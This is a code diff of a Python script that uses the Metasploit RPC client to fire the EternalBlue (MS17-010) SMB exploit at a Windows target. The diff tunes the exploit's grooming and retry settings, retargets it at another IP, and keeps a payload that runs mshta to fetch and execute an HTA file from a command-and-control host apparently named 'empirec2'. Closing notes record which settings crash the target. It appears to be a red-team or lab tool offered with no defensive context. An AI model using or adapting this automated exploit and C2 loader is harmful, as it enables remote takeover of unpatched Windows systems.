@@ -18,7 +18,9 @@ def run(client, RHOST, CMD):
     # there's a client.modules.use... but can't get it to work
     # console.write is copy-&-paste friendly; copy from Armitage/msfconsole successful run
     console.write('use exploit/windows/smb/ms17_010_eternalblue')
-    console.write('set MaxExploitAttempts 1')
+    console.write('set GroomAllocations 12')
+    console.write('set GroomDelta 5')
+    console.write('set MaxExploitAttempts 2')
     console.write('set Process smss.exe')
     console.write('set RHOST {0}'.format(RHOST))
     console.write('set PAYLOAD windows/x64/exec')
@@ -29,7 +31,7 @@ def run(client, RHOST, CMD):
 if __name__ == '__main__':
     client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
     cmd = 'mshta.exe http://empirec2:8000/o.hta'
-    run(client, '192.168.181.192', cmd)
+    run(client, '192.168.181.196', cmd)
 """
 The default 'MaxExploitAttempts 3' tend to crash the target (Win7x64 enterprise)
 that I tested on. Using PAYLOAD windows/x64/meterpreter/reverse_https also tend to crash target.
